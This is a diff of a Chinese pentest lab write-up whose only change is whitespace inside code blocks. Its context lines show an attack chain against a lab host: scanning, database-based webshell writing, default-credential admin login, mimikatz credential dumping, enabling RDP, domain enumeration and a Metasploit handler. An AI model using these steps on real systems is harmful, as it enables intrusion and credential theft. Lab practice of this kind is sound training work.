@@ -47,7 +47,7 @@ tags:
 * 主机发现
 
     ```s
-
+     
     arp-scan -l
 
     nmap -sP 192.168.197.0/24
@@ -59,7 +59,7 @@ tags:
 * 服务发现
 
     ```s
-
+     
     nmap -sV -A 192.168.197.134
 
     Not shown: 997 filtered tcp ports (no-response)
@@ -76,7 +76,7 @@ tags:
 * 目录扫描
 
     ```s
-
+     
     dirsearch -u http://192.168.197.134 -o dir.txt
     dirb http://192.168.197.134/
     python3 dirmap.py -i http://192.168.197.134 -lcf
@@ -89,7 +89,7 @@ tags:
 * 指纹识别
 
     ```s
-
+     
     whatweb http://192.168.197.134 # 无果
 
     ```
@@ -97,7 +97,7 @@ tags:
 * 源码下载
 
     ```s
-
+     
     下载下网站源码，看robots.txt发现/data和/protected禁止访问，查看对应内容
 
     config.php为数据库连接配置文件，找到连接用户名密码均为root，可以登录phpmyadmin
@@ -113,7 +113,7 @@ tags:
     2.有写入权限(查询secure_file_priv参数，查看是否具有读写文件权限，若为NULL则没有办法写入shell。这个值是只读变量，只能通过配置文件修改，且更改后需重启服务才生效)
 
     ```s
-
+     
     #查路径
     show variables like '%datadir%';
     或者
@@ -142,7 +142,7 @@ tags:
 * 网站后台写shell
 
     ```s
-
+     
     访问yxcms目录，发现有信息泄露
 
     #本站为YXcms的默认演示模板，YXcms是一款基于PHP+MYSQL构建的高效网站管理系统。 后台地址请在网址后面加上/index.php?r=admin进入。 后台的用户名:admin;密码:123456，请进入后修改默认密码。
@@ -165,7 +165,7 @@ tags:
 * 获取凭证
 
     ```s
-
+     
     提权system后hashdump->mimikatz获取主机登陆密码hongri@2022#这是之前改过后的密码
 
     ```
@@ -173,7 +173,7 @@ tags:
 * 开启服务
 
     ```s
-
+     
     #虚拟终端查询主机是否开启3389
     netstat -ano | findstr "3389"#没开
 
@@ -193,7 +193,7 @@ tags:
 * 登陆
 
     ```s
-
+     
     rdesktop 192.168.197.134#GOD\Administrator   hongri@2022
     ```
 
@@ -204,7 +204,7 @@ tags:
 * 域信息收集
 
     ```s
-
+     
     net config workstation#查看是否有域以及当前域
 
     net user /domain#查看域内用户列表
@@ -222,7 +222,7 @@ tags:
 * 内网漏洞扫描
 
     ```s
-
+     
     用主机上的namp扫描内网及可利用的漏洞
     
     nmap --script=vuln 192.168.48.0/24
@@ -243,7 +243,7 @@ tags:
 * msf和cs联动
 
     ```s
-
+     
     #msf开一个监听模式
     
     use multi/handler
